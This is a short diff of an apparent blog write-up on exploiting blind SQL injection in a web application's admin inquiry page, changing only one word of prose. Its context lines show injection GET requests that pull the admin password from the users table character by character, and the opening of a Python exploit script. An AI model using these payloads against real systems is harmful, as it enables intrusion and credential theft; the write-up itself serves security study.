@@ -5,7 +5,7 @@
 +1),1,1))=48)--+ 
 GET /mpms/admin/?page=inquiries/view_inquiry&amp;id=4'+AND+(ascii(substring((SELECT+password+FROM+mpms_db.users+WHERE+id=1+LIMIT
 +1),1,1))=47)--+ 
-</code></pre></div></div><p><img src="/assets/images/fuzz1.png" alt="" /> <img src="/assets/images/fuzz2.png" alt="" /></p><p>It does look like we get different content lengths when the exploit fails to execute. This means we can start working on an exploit right away.</p><p><strong>The Exploit</strong></p><p>The exploit is actually surprisingly simple. I ended up pruning the GET request of all uneccessary headers to get the request size down, wrote a for loop for the Blind SQL Injection and then a get_token function to store the token. Here it is:</p><div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+</code></pre></div></div><p><img src="/assets/images/fuzz1.png" alt="" /> <img src="/assets/images/fuzz2.png" alt="" /></p><p>It does look like we get different content lengths when the query fails to execute. This means we can start working on an exploit right away.</p><p><strong>The Exploit</strong></p><p>The exploit is actually surprisingly simple. I ended up pruning the GET request of all uneccessary headers to get the request size down, wrote a for loop for the Blind SQL Injection and then a get_token function to store the token. Here it is:</p><div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
 
 <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">session</span><span class="p">()</span>
 
